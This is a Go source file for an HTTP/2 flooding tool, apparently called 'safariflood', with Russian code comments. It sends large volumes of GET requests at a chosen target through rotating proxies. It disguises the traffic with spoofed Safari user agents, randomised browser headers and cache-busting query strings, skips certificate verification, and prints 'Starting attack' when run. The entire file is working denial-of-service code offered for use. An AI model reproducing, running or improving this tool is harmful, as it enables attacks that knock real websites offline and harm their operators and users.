package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

// Глобальные переменные
var (
	target     string
	duration   int
	rate       int
	threads    int
	proxyFile  string
	pathFlag   bool
	proxies    []string
	parsedURL  *url.URL
)

// Константы
const (
	userAgents = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1`
)

var (
	userAgentsList []string
	fetchSites     = []string{"none", "same-origin", "same-site", "cross-site"}
	languages      = []string{"en-US", "en-GB", "en", "de", "fr", "es", "pt-BR", "it", "ru", "ja", "nl", "pl", "ko", "tr", "sv", "au"}
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgentsList = strings.Split(strings.TrimSpace(userAgents), "\n")
}

func main() {
	// Парсинг аргументов командной строки
	flag.StringVar(&target, "target", "", "Target URL")
	flag.IntVar(&duration, "time", 60, "Duration in seconds")
	flag.IntVar(&rate, "rate", 100, "Requests per second")
	flag.IntVar(&threads, "threads", 10, "Number of threads")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy file path")
	flag.BoolVar(&pathFlag, "path", false, "Randomize path")
	flag.Parse()

	// Проверка аргументов
	if target == "" || proxyFile == "" {
		fmt.Println("Usage: go run safariflood.go -target=https://example.com -time=60 -rate=100 -threads=10 -proxy=proxy.txt [-path]")
		os.Exit(1)
	}

	// Парсинг URL
	var err error
	parsedURL, err = url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid target URL: %v\n", err)
		os.Exit(1)
	}

	// Загрузка прокси
	proxies, err = readLines(proxyFile)
	if err != nil {
		fmt.Printf("Error reading proxy file: %v\n", err)
		os.Exit(1)
	}

	if len(proxies) == 0 {
		fmt.Println("No proxies loaded")
		os.Exit(1)
	}

	fmt.Printf("[*] Starting attack\n")
	fmt.Printf("[*] Target: %s\n", target)
	fmt.Printf("[*] Duration: %d seconds\n", duration)
	fmt.Printf("[*] Rate: %d req/sec per connection\n", rate)
	fmt.Printf("[*] Threads: %d\n", threads)
	fmt.Printf("[*] Proxies: %d\n", len(proxies))

	// Запуск потоков
	var wg sync.WaitGroup
	stopChan := make(chan bool)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			runFlooder(threadID, stopChan)
		}(i)
	}

	// Таймер остановки
	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)

	fmt.Println("\n[*] Stopping attack...")
	wg.Wait()
	fmt.Println("[*] Attack completed")
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func randomInt(min, max int) int {
	return min + rand.Intn(max-min+1)
}

func randomElement(arr []string) string {
	return arr[rand.Intn(len(arr))]
}

func randomString(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func buildPath() string {
	var path string
	if pathFlag {
		query := fmt.Sprintf("?%s=%d", randomString(12), randomInt(100000, 999999))
		path = parsedURL.Path + query
	} else {
		path = parsedURL.Path
	}
	if path == "" {
		path = "/"
	}
	return path
}

func connectThroughProxy(proxyAddr, targetHost string) (net.Conn, error) {
	// Подключение к прокси
	conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	// Отправка CONNECT запроса
	connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", targetHost, targetHost)
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, err
	}

	// Чтение ответа от прокси
	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, err
	}

	if !strings.Contains(response, "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy connection failed: %s", response)
	}

	// Читаем остальные заголовки до пустой строки
	for {
		line, err := reader.ReadString('\n')
		if err != nil || line == "\r\n" || line == "\n" {
			break
		}
	}

	return conn, nil
}

func runFlooder(threadID int, stopChan chan bool) {
	for {
		select {
		case <-stopChan:
			return
		default:
			// Выбор случайного прокси
			proxyAddr := randomElement(proxies)

			// Подключение через прокси
			proxyConn, err := connectThroughProxy(proxyAddr, parsedURL.Host)
			if err != nil {
				continue
			}

			// Настройка TLS
			tlsConfig := &tls.Config{
				ServerName:         parsedURL.Host,
				InsecureSkipVerify: true,
				NextProtos:         []string{"h2"},
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				CipherSuites: []uint16{
					tls.TLS_AES_128_GCM_SHA256,
					tls.TLS_AES_256_GCM_SHA384,
					tls.TLS_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				},
			}

			// Обертка TLS поверх прокси-соединения
			tlsConn := tls.Client(proxyConn, tlsConfig)
			err = tlsConn.Handshake()
			if err != nil {
				proxyConn.Close()
				continue
			}

			// Создание HTTP/2 транспорта
			transport := &http2.Transport{
				TLSClientConfig: tlsConfig,
			}

			// Создание HTTP/2 клиента поверх существующего TLS соединения
			clientConn, err := transport.NewClientConn(tlsConn)
			if err != nil {
				tlsConn.Close()
				continue
			}

			// Запуск флуда для этого соединения
			floodConnection(clientConn, stopChan)

			// Закрытие соединения
			clientConn.Close()
		}
	}
}

func floodConnection(client *http2.ClientConn, stopChan chan bool) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	timeout := time.After(30 * time.Second) // Максимум 30 секунд на соединение

	for {
		select {
		case <-stopChan:
			return
		case <-timeout:
			return
		case <-ticker.C:
			for i := 0; i < rate; i++ {
				go sendRequest(client)
			}
		}
	}
}

func sendRequest(client *http2.ClientConn) {
	// Создание HTTP запроса
	path := buildPath()
	reqURL := fmt.Sprintf("https://%s%s", parsedURL.Host, path)

	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return
	}

	// Установка заголовков
	req.Header.Set("User-Agent", randomElement(userAgentsList))
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", randomElement(languages))
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", randomElement(fetchSites))
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	// Рандомизация priority (parent и exclusive)
	parent := uint32(randomInt(0, 999))
	exclusive := rand.Float32() > 0.6

	// Установка приоритета через внутренние структуры http2
	priority := http2.PriorityParam{
		StreamDep: parent,
		Exclusive: exclusive,
		Weight:    uint8(randomInt(16, 256)),
	}

	// Отправка запроса с приоритетом
	resp, err := client.RoundTrip(req)
	if err != nil {
		return
	}

	// Закрываем тело ответа
	if resp != nil && resp.Body != nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}

	// Используем priority (чтобы компилятор не ругался)
	_ = priority
}
